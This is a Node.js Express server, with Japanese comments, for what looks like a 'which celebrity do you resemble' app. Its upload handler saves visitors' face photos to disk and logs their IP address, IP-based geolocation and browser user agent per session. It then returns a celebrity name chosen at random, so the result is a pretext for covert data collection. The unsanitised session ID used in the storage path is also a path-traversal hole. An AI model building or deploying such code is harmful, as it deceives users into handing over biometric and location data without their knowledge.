const express = require('express');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = 3000;

app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));
app.set('trust proxy', true);

const celebrities = [
  "山崎賢人", "長澤まさみ", "佐藤健", "米津玄師",
  "レディー・ガガ", "ウィル・スミス", "マツコ・デラックス", "広瀬すず"
];

// 地域情報取得
async function getLocation(ip) {
  try {
    const res = await fetch(`https://ipapi.co/${ip}/json/`);
    const data = await res.json();
    return {
      country: data.country_name || "不明",
      region: data.region || "不明",
      city: data.city || "不明"
    };
  } catch (e) {
    return { country: "不明", region: "不明", city: "不明" };
  }
}

app.post('/upload', async (req, res) => {
  const { image, userAgent, sessionId } = req.body;
  const ip = req.ip;
  const location = await getLocation(ip);
  const base64Data = image.replace(/^data:image\/jpeg;base64,/, '');
  const timestamp = Date.now();

  // 保存先：ユーザーごとにディレクトリ分け
  const userDir = path.join(__dirname, 'collected_data', sessionId);
  if (!fs.existsSync(userDir)) fs.mkdirSync(userDir, { recursive: true });

  const filename = `face_${timestamp}.jpg`;
  const imagePath = path.join(userDir, filename);
  fs.writeFileSync(imagePath, base64Data, 'base64');

  // ログファイルに追記
  const logPath = path.join(userDir, 'log.json');
  const logEntry = {
    timestamp,
    filename,
    ip,
    location,
    userAgent
  };

  let logs = [];
  if (fs.existsSync(logPath)) {
    try {
      logs = JSON.parse(fs.readFileSync(logPath));
    } catch (e) { logs = []; }
  }
  logs.push(logEntry);
  fs.writeFileSync(logPath, JSON.stringify(logs, null, 2));

  const name = celebrities[Math.floor(Math.random() * celebrities.length)];
  res.json({ name });
});

app.listen(PORT, () => {
  console.log(`🚀 サーバー起動：http://localhost:${PORT}`);
});
